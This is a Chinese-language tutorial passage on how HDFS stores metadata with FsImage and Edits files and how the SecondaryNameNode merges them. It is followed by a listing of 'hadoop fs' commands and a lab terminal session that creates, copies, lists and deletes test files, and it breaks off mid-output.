<h3 id="Edits和Fsimage详解与合并流程"><a href="#Edits和Fsimage详解与合并流程" class="headerlink" title="Edits和Fsimage详解与合并流程"></a>Edits和Fsimage详解与合并流程</h3><h4 id="NameNode如何管理和存储元数据"><a href="#NameNode如何管理和存储元数据" class="headerlink" title="NameNode如何管理和存储元数据"></a>NameNode如何管理和存储元数据</h4><p>计算机中存储数据有两种：内存或磁盘 元数据存储磁盘: 存储磁盘无法面对客户端对元数据信息的任意的快速低延迟的响应，但是安全性高元数据存储内存：元数据存放内存，可以高效的查询以及快速响应客户端的查询请求，数据保存在内存，如果断电，内存中的数据全部丢失</p>
<p>因此，考虑上述两种存储方式的优缺点，HDFS采用了内存+磁盘的形式来管理元数据。即: NameNode(内存)+FsImage文件. 其中，NameNode文件维护了文件与数据块的映射表以及数据块与数据节点的映射表，比如，一个文件它被切分成了几个数据块，这些数据块分别存储在哪些datanode节点上。而Fsimage保存在磁盘上，为某一时刻下内存中元数据在本地磁盘的映射。就是在该时刻下，内存中元数据记录的所有文件块和目录，分别的状态，位于哪些datanode，各自的权限，各自的副本个数等 (可以通过查看Fsimage保存的内容可以看到上述信息)。因此，利用<strong>内存</strong>+<strong>磁盘</strong>的方式，内存中的元数据可以快速响应客户端的用户请求，而映射到磁盘中的元数据Fsimage可以实现安全性，防止数据的丢失。</p>
<p>而接下来的一个新问题是：磁盘和内存中的元数据如何进行划分。 即两个数据一摸一样，还是两个数据合并到一起才是一份完整的数据呢？</p>
<ul>
<li><strong>一模一样</strong>：client如果对元数据进行增删改操作，需要保证两个数据的一致。FsImage文件操作起来效率也不高，因为FsImage存储在磁盘中，对磁盘中的内容进行写入势必会增加很多的IO操作，也要占用CPU。此时，相当于每一次增删改操作，都需要对两个文件同时进行修改。</li>
<li><strong>两个合并&#x3D;完整数据</strong>：由于如果要将操作写入磁盘会降低运行效率。所以想法就是对于增删改操作，只有内存中的元数据进行响应，而不直接进行磁盘IO读写。此时，为了保证两个数据的一致性，NameNode就引入了以一个edits文件，该日志文件只能进行追加写入，以此来记录client的每次增删改操作。虽然此时仍然有IO流的操作，但是相比于每次将元数据内容写入Fsimage，edits日志文件的写入内容更少，效率更高。</li>
</ul>
<p>至此我们知道了HDFS元数据管理机制采用了内存+磁盘的形式，内存中的NameNode来快速响应客户端的查询请求，磁盘中的元数据作为备份，防止数据的丢失。同时，为了保证内存和磁盘中元数据的一致，hdfs采用了一个edits的日志文件，该文件记录了客户端对元数据的操作。利用edits+Fsimage的形式，就完成了对元数据的管理和存储。</p>
<h4 id="FsImage"><a href="#FsImage" class="headerlink" title="FsImage"></a>FsImage</h4><p>FsImage: 是namenode中关于元数据的镜像，一般称为检查点(checkpoing)，这里包含了HDFS文件系统所有目录以及文件相关信息（Block数量，副本数量，权限等信息）</p>
<p>在机器学习或这深度学习模型训练的过程中，为了防止异常中断，所以都会设定在某一具体时刻或者效果达到最好结果时，将模型参数都保存下来。这样，后续就可以在异常中断后利用来文件直接对模型的参数进行初始化赋值，而不用再重新进行训练。在模型训练中保存的文件也叫作checkpoint。因此这里HDFS的检查点checkpoint也可以同样来理解。即FsImage保存了某一时刻下元数据内的所有信息，这样，当HDFS异常中断或者程序启动时，就可以利用该检查点文件，来对元数据进行初始化，以此还原到异常中断或程序停止前的最新状态。</p>
<h4 id="Edits文件"><a href="#Edits文件" class="headerlink" title="Edits文件"></a>Edits文件</h4><p>存储了客户端对HDFS文件系统所有的更新操作记录，Client对HDFS文件系统所有的更新操作都会被记录到Edits文件中(不包括查询操作)</p>
<p>Client对HDFS的更新操作会更新内存中的元数据信息，而不会直接写入到FsImage文件中。那么为了保证内存和磁盘中元数据信息的一致性，就利用了edits文件来记录下所有的更新操作。<strong>edits文件记录的就是当原FsImage被载入内存后，Client又对元数据进行了哪些操作。</strong> 这样，只要在原FsImage中执行这些操作，对保存的元数据信息进行更新，就可以使得内存和磁盘汇总的元数据信息一致。通过此方法，即解决了为了保证一致性，要对FsImage直接进行写入的过程。这也是引入edits文件的关键原因。</p>
<h4 id="Fsimage与Edits的合并"><a href="#Fsimage与Edits的合并" class="headerlink" title="Fsimage与Edits的合并"></a>Fsimage与Edits的合并</h4><p>因为edits文件是一个只能追加写入的文件，在程序运行过程中会不断的记录客户端的更新操作。同时，根据上面对Edits中的介绍可知，引入载入的FsImage的元数据内容不是最新状态，所以只有在FsImage的内容上，执行edits文件中的更新操作，才能将FsImage的元数据更新为最新状态。此时，假设edits不断的进行追加写，当某一时刻需要NameNode重启时，此时NameNode会先将FsImage里面的内容映射到内存中，即相当于对元数据进行初始化，同时为了恢复到最新的状态，还需要在一条一条的执行edits中的记录。当edits文件非常大时，会导致NameNode启动过程非常慢，而在这段时间HDFS系统会处于<strong>安全模式</strong>，即保证了要将元数据恢复到最新后才能接收客户端请求。这显然是不符合用户要求的。因此，就需要设计能不能在NameNode运行的时候使得edits文件小一些，这样就能使启动过程加快。所以就要引入FsImage和Edits的合并过程。</p>
<p>合并过程的执行流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220104944.jpg" alt="2"></p>
<p>首先可以看出，除了NameNode节点外，为了进行合并，还引入了另一个SecondaryNameNode节点。SecondaryNameNode是HDFS架构中的一个组成部分，它是用来保存Namenode中对HDFS metadata的信息的备份而设定的。一般都是将SecondaryNamenode单独运行在一台机器上。</p>
<p>详细流程介绍如下： <strong>首先黑色字体代表的流程表示NameNode自身启动和运行时的流程，下面每个序号对应图中流程。</strong></p>
<p> 1）程序启动时，需要对元数据进行恢复。根据上述对FsImage和edits文件的已经知道，HDFS首先将Fsimage读入内存对元数据进行恢复，然后再读edits文件中的更新操作在恢复后的元数据上进行执行，使得此时的NameNode中保存的是停止前的最新状态。 </p>
<p>2、3）当有客户端执行增删改查操作时，HDFS会记录其中的增删改操作到edits文件中，这样就避免了直接对Fsimage文件的IO操作。 </p>
<ol start="4">
<li>内存中保存的元数据执行客户端的增删改查操作。（FsImage在此阶段是不改变的）</li>
</ol>
<p><strong>粉色字体代表的流程表示SecondaryNameNode对文件的合并流程，下面每个序号对应图中流程。</strong> </p>
<p>1）SecondaryNameNode向NameNode发送请求，询问是否需要进行合并。在Hadoop中通过两个维度来控制是否需要Checkpoint，如图中所示：1) 到定时时间 2) Edits文件是否满或超过了设定的大小范围。</p>
<p>2）如果满足上面的触发条件，则开始下述执行合并流程。 </p>
<p>3、4）由于NameNode需要将此时的edits文件和FsImage文件发送到SecondaryNamenode，所以在NameNode节点上需要停止使用该edits文件，暂时将新的写操作写到一个新的文件比如edits_inprogress_002中，而将原先的edits_inprogress_001重命名为esits_001进行发送。这样，有inprogress标识的edits表示最新正在写入更新操作的文件，而没有该标识，且后面数字最大的edits文件，即表示最后一个已经合并的文件。比如在实际的文件夹下会生成以下文件：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220105511.jpg" alt="img"></p>
<p>各文件名的含义即如上所述。</p>
<p>5）SecondaryNamenode通过HTTP GET方式从NameNode上获取到fsimage和edits文件，并下载到本地的相应目录下。然后，SecondaryNameNode将下载下来的fsimage载入内存，然后一条一条地执行edits文件中的各项更新操作，使得内存中的fsimage保存最新；<strong>这个过程就是edits和fsimage文件的合并。</strong>（是不是跟我们上面说的在NameNode启动时的载入过程很像。HDFS就是利用了另一台机器的资源来对FsImage进行更新，这样NameNode所在节点的资源就只专注响应对客户端的操作）。</p>
<p>6）经过合并阶段之后，FsImage的内容即进行了更新，此时并不与NameNode中的元数据内容一致，相差的仍然是edits_inprogress_002中写入的更新操作。</p>
<p>7、8）SecondaryNameNode会通过post方式将新的FsImage文件发送到NameNode节点上。NameNode将接收到的新的fsimage替换旧的fsimage文件，同时将edit_inprogress_002文件来记录合并后续的更新操作。通过这个过程，edits就变小了。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过上面的描述可以总结几点。</p>
<ol>
<li>为了解决元数据备份的问题，HDFS采用了edits+FsImage的策略，edits文件保存了客户端的更新操作，Fsimage保存了元数据的具体内容。HDFS在运行时将客户端的操作响应在内容中的元数据上，同时将所有的更新操作写入edits文件，避免了直接对FsImage进行操作造成效率降低</li>
<li>HDFS为了解决edits不断追加写入过大的问题，采用了edits与FsImage合并的策略。即edits文件不是一直在原文件中进行写入的，而是在一定时间或者条件后，就把该时间段内客户端的更新操作同步到FsImage文件中，来更新FsImage文件的内容。这样，新的edits文件就可以只记录合并之后的更新操作，从而减小了edits文件的大小。</li>
<li>HDFS通过引入SecondaryNameNode来实现上述过程，利用了一台独立的机器资源来处理合并流程。所谓edits与FsImage的合并，其实就是在SecondaryNamenode内存中，将edits中记录一条一条的在fsiamge中执行，来更新Fsimage的内容。同时，可以知道，SecondaryNameNode获取到的FsImage不是最新的，因为在它从NameNode下载edits和FsImage文件的时候，新的更新操作已经写到新的edits文件里去了（比如这里的edits_inprogress_002）。而这些更新在SecondaryNamenode是没有同步到的。</li>
<li>edits和FsImage利用了文件命名格式来标识各自的最新文件。如fsiamge和edits文件图中所示，edits文件以edits_开头，后面跟一个txid范围端，并且多个edit log之间首尾相连，正在使用的edits文件名字为edits_inprogress_txid。该路径下还会保存两个FsImage文件（<code>dfs.namenode.num.checkpoints.retained</code>在namenode上保存的fsimage个数的默认配置，超过的被删除，默认保存两个）。文件格式为fsimage_txid，txid与edits中的txid对应，表示该fsimage加载的是哪一个edits。比如从图中可以看出，此时的fsimage已经加载到尾数为1545的edits文件内容</li>
</ol>
<h4 id="其它补充"><a href="#其它补充" class="headerlink" title="其它补充"></a>其它补充</h4><p>实际查看FsImage文件的内容时，可以发现Fsimage中是没有记录块所对应DataNode的。比如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220105313.jpg" alt="img"></p>
<p>在内存元数据中是有记录块所对应的datanode信息，但是fsimage中就剔除了这个信息；HDFS集群在启动的时候会加载image以及edits文件，block对应的dn信息都没有记录，集群启动时会有一个安全模式（safemode）,安全模式就是为了让datanode汇报自己当前所持有的block信息给nn来补全元数据。后续每隔一段时间datanode都要汇报自己持有的block信息。因为即使fsimage中记录了datanode信息，但是在恢复元数据的过程中，可能某些datanode节点出现了问题。所以，其实无论FsImage中是否对block的dn信息进行了记录，恢复的时候都是需要dn来汇报自己持有的block信息，这样才是最真实和安全的。</p>
<h2 id="二、实验代码及命令分析"><a href="#二、实验代码及命令分析" class="headerlink" title="二、实验代码及命令分析"></a>二、实验代码及命令分析</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>hadoop fs 具体命令 OR hdfs dfs 具体命令</p>
<p>两个是完全相同的。</p>
<h3 id="命令大全"><a href="#命令大全" class="headerlink" title="命令大全"></a>命令大全</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs</span><br><span class="line">Usage: hadoop fs [generic options]</span><br><span class="line">	[-appendToFile &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-cat [-ignoreCrc] &lt;src&gt; ...]</span><br><span class="line">	[-checksum &lt;src&gt; ...]</span><br><span class="line">	[-chgrp [-R] GROUP PATH...]</span><br><span class="line">	[-chmod [-R] &lt;MODE[,MODE]... | OCTALMODE&gt; PATH...]</span><br><span class="line">	[-chown [-R] [OWNER][:[GROUP]] PATH...]</span><br><span class="line">	[-copyFromLocal [-f] [-p] [-l] [-d] [-t &lt;thread count&gt;] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-copyToLocal [-f] [-p] [-ignoreCrc] [-crc] &lt;src&gt; ... &lt;localdst&gt;]</span><br><span class="line">	[-count [-q] [-h] [-v] [-t [&lt;storage type&gt;]] [-u] [-x] [-e] &lt;path&gt; ...]</span><br><span class="line">	[-cp [-f] [-p | -p[topax]] [-d] &lt;src&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-createSnapshot &lt;snapshotDir&gt; [&lt;snapshotName&gt;]]</span><br><span class="line">	[-deleteSnapshot &lt;snapshotDir&gt; &lt;snapshotName&gt;]</span><br><span class="line">	[-df [-h] [&lt;path&gt; ...]]</span><br><span class="line">	[-du [-s] [-h] [-v] [-x] &lt;path&gt; ...]</span><br><span class="line">	[-expunge]</span><br><span class="line">	[-find &lt;path&gt; ... &lt;expression&gt; ...]</span><br><span class="line">	[-get [-f] [-p] [-ignoreCrc] [-crc] &lt;src&gt; ... &lt;localdst&gt;]</span><br><span class="line">	[-getfacl [-R] &lt;path&gt;]</span><br><span class="line">	[-getfattr [-R] &#123;-n name | -d&#125; [-e en] &lt;path&gt;]</span><br><span class="line">	[-getmerge [-nl] [-skip-empty-file] &lt;src&gt; &lt;localdst&gt;]</span><br><span class="line">	[-head &lt;file&gt;]</span><br><span class="line">	[-help [cmd ...]]</span><br><span class="line">	[-ls [-C] [-d] [-h] [-q] [-R] [-t] [-S] [-r] [-u] [-e] [&lt;path&gt; ...]]</span><br><span class="line">	[-mkdir [-p] &lt;path&gt; ...]</span><br><span class="line">	[-moveFromLocal &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-moveToLocal &lt;src&gt; &lt;localdst&gt;]</span><br><span class="line">	[-mv &lt;src&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-put [-f] [-p] [-l] [-d] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">	[-renameSnapshot &lt;snapshotDir&gt; &lt;oldName&gt; &lt;newName&gt;]</span><br><span class="line">	[-rm [-f] [-r|-R] [-skipTrash] [-safely] &lt;src&gt; ...]</span><br><span class="line">	[-rmdir [--ignore-fail-on-non-empty] &lt;dir&gt; ...]</span><br><span class="line">	[-setfacl [-R] [&#123;-b|-k&#125; &#123;-m|-x &lt;acl_spec&gt;&#125; &lt;path&gt;]|[--set &lt;acl_spec&gt; &lt;path&gt;]]</span><br><span class="line">	[-setfattr &#123;-n name [-v value] | -x name&#125; &lt;path&gt;]</span><br><span class="line">	[-setrep [-R] [-w] &lt;rep&gt; &lt;path&gt; ...]</span><br><span class="line">	[-stat [format] &lt;path&gt; ...]</span><br><span class="line">	[-tail [-f] [-s &lt;sleep interval&gt;] &lt;file&gt;]</span><br><span class="line">	[-test -[defsz] &lt;path&gt;]</span><br><span class="line">	[-text [-ignoreCrc] &lt;src&gt; ...]</span><br><span class="line">	[-touch [-a] [-m] [-t TIMESTAMP ] [-c] &lt;path&gt; ...]</span><br><span class="line">	[-touchz &lt;path&gt; ...]</span><br><span class="line">	[-truncate [-w] &lt;length&gt; &lt;path&gt; ...]</span><br><span class="line">	[-usage [cmd ...]]</span><br><span class="line"></span><br><span class="line">Generic options supported are:</span><br><span class="line">-conf &lt;configuration file&gt;        specify an application configuration file</span><br><span class="line">-D &lt;property=value&gt;               define a value for a given property</span><br><span class="line">-fs &lt;file:///|hdfs://namenode:port&gt; specify default filesystem URL to use, overrides &#x27;fs.defaultFS&#x27; property from configurations.</span><br><span class="line">-jt &lt;local|resourcemanager:port&gt;  specify a ResourceManager</span><br><span class="line">-files &lt;file1,...&gt;                specify a comma-separated list of files to be copied to the map reduce cluster</span><br><span class="line">-libjars &lt;jar1,...&gt;               specify a comma-separated list of jar files to be included in the classpath</span><br><span class="line">-archives &lt;archive1,...&gt;          specify a comma-separated list of archives to be unarchived on the compute machines</span><br><span class="line"></span><br><span class="line">The general command line syntax is:</span><br><span class="line">command [genericOptions] [commandOptions]</span><br></pre></td></tr></table></figure>

<h3 id="常见操作"><a href="#常见操作" class="headerlink" title="常见操作"></a>常见操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">help</span> 输出这个命令的参数</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -help rm</span><br><span class="line">-rm [-f] [-r|-R] [-skipTrash] [-safely] &lt;src&gt; ... :</span><br><span class="line">  Delete all files that match the specified file pattern. Equivalent to the Unix</span><br><span class="line">  command &quot;rm &lt;src&gt;&quot;</span><br><span class="line">                                                                                 </span><br><span class="line">  -f          If the file does not exist, do not display a diagnostic message or </span><br><span class="line">              modify the exit status to reflect an error.                        </span><br><span class="line">  -[rR]       Recursively deletes directories.                                   </span><br><span class="line">  -skipTrash  option bypasses trash, if enabled, and immediately deletes &lt;src&gt;.  </span><br><span class="line">  -safely     option requires safety confirmation, if enabled, requires          </span><br><span class="line">              confirmation before deleting large directory with more than        </span><br><span class="line">              &lt;hadoop.shell.delete.limit.num.files&gt; files. Delay is expected when</span><br><span class="line">              walking over large directory recursively to count the number of    </span><br><span class="line">              files to be deleted before the confirmation. </span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">mkdir</span> 新建文件夹</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop fs -mkdir /sanguo</span><br><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi shuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-moveFromLocal 从本地剪切粘贴到HDFS</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -moveFromLocal ./shuguo.txt /sanguo</span><br><span class="line">2021-06-30 13:55:50,370 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 212</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6月  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6月  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6月  28 12:13 wcinput</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi weiguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-copyFromLocal 从本地文件系统拷贝到HDFS路径去</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -copyFromLocal ./weiguo.txt /sanguo</span><br><span class="line">2021-06-30 13:57:22,614 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 216</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6月  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6月  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6月  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:56 weiguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi wuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-put 等同于copyFromLocal，生产环境更习惯用put</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -put ./wuguo.txt /sanguo</span><br><span class="line">2021-06-30 13:58:16,277 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi liubei.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-appendFile 追加一个文件到已经存在的文件末尾</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -appendToFile ./liubei.txt /sanguo/shuguo.txt</span><br><span class="line">2021-06-30 14:00:23,765 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-copyToLocal 从HDFS拷贝到本地</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -copyToLocal /sanguo/shuguo.txt ./</span><br><span class="line">2021-06-30 14:01:16,117 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 228</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6月  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:59 liubei.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6月  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6月  30 14:01 shuguo.txt</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6月  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:56 weiguo.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      6 6月  30 13:58 wuguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ vi shuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-get 等同于copyToLocal，生产环境更喜欢用get</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -get /sanguo/shuguo.txt ./shuguo2.txt </span><br><span class="line">2021-06-30 14:05:26,350 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ll</span><br><span class="line">总用量 232</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 bin</span><br><span class="line">drwxrwxr-x. 4 huang huang   4096 6月  28 11:54 data</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 etc</span><br><span class="line">drwxr-xr-x. 2 huang huang   4096 9月  12 2019 include</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 lib</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 libexec</span><br><span class="line">-rw-rw-r--. 1 huang huang 147145 9月   4 2019 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:59 liubei.txt</span><br><span class="line">drwxrwxr-x. 3 huang huang   4096 6月  29 20:38 logs</span><br><span class="line">-rw-rw-r--. 1 huang huang  21867 9月   4 2019 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang   1366 9月   4 2019 README.txt</span><br><span class="line">drwxr-xr-x. 3 huang huang   4096 9月  12 2019 sbin</span><br><span class="line">drwxr-xr-x. 4 huang huang   4096 9月  12 2019 share</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6月  30 14:05 shuguo2.txt</span><br><span class="line">-rw-r--r--. 1 huang huang     14 6月  30 14:01 shuguo.txt</span><br><span class="line">drwxrwxr-x. 2 huang huang   4096 6月  28 12:13 wcinput</span><br><span class="line">-rw-rw-r--. 1 huang huang      7 6月  30 13:56 weiguo.txt</span><br><span class="line">-rw-rw-r--. 1 huang huang      6 6月  30 13:58 wuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">ls</span> 显示目录信息</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -ls /sanguo</span><br><span class="line">Found 3 items</span><br><span class="line">-rw-r--r--   3 huang supergroup         14 2021-06-30 14:00 /sanguo/shuguo.txt</span><br><span class="line">-rw-r--r--   3 huang supergroup          7 2021-06-30 13:57 /sanguo/weiguo.txt</span><br><span class="line">-rw-r--r--   3 huang supergroup          6 2021-06-30 13:58 /sanguo/wuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">cat</span> 显示文件内容</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -cat /sanguo/wuguo.txt</span><br><span class="line">2021-06-30 14:06:27,858 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">wuguo</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">chgrp</span>，-<span class="built_in">chmod</span>，-<span class="built_in">chown</span>：linux文件系统中的用法一样，修改文件所属权限</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -chmod 666 /sanguo/shuguo.txt</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -chown huang:huang /sanguo/shuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">mkdir</span> 创建路径</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mkdir /jinguo</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">cp</span> 从HDFS的一个路径拷贝到HDFS的另一个路径</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -cp /sanguo/shuguo.txt /jinguo</span><br><span class="line">2021-06-30 14:09:11,407 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-06-30 14:09:11,512 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">mv</span> 在HDFS目录中移动文件</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mv /sanguo/wuguo.txt /jinguo</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -mv /sanguo/weiguo.txt /jinguo</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">tail</span> 显示一个文件的末尾1kb的数据</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -tail /jinguo/shuguo.txt</span><br><span class="line">2021-06-30 14:11:43,198 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">shuguo</span><br><span class="line">liubei</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">rm</span> 删除文件或文件夹</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -rm /sanguo/shuguo.txt</span><br><span class="line">Deleted /sanguo/shuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">rm</span> -r 递归删除目录及目录里面内容</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -rm -r /sanguo</span><br><span class="line">Deleted /sanguo</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-<span class="built_in">du</span> 统计文件夹的大小信息</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -du -s -h /jinguo</span><br><span class="line">27  81  /jinguo</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -du -h /jinguo</span><br><span class="line">14  42  /jinguo/shuguo.txt</span><br><span class="line">7   21  /jinguo/weiguo.txt</span><br><span class="line">6   18  /jinguo/wuguo.txt</span><br><span class="line"><span class="meta">#</span><span class="language-bash">-setrep 设置HDFS中文件的副本数量</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">这里得看DataNode的数量，因为目前只有3台设备，最多就3个副本，只有节点数增加到10副本数才能达到10</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop fs -setrep 10 /jinguo/shuguo.txt</span><br><span class="line">Replication 10 set: 